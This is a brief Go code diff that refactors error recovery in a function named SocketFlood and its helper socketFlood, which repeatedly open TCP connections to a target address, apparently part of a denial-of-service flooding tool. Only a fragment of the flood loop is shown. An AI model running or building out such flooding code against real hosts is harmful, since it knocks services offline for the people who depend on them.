@@ -12,12 +12,7 @@ import (
 
 func SocketFlood(target string, port string, duration string) {
 
-	defer func() { // try catch
-		if er := recover(); er != nil {
-			fmt.Print(er)
-			return
-		}
-	}()
+	defer Catch()
 
 	duration = strings.ReplaceAll(duration, "\x00", "")
 	duration = strings.ReplaceAll(duration, "\x03", "")
@@ -44,6 +39,7 @@ func SocketFlood(target string, port string, duration string) {
 }
 
 func socketFlood(addr, payload string) {
+	defer Catch()
 	for i := 0; i <= 30; i++ {
 		fmt.Println(i)
 		socket, err := net.Dial("tcp", addr)
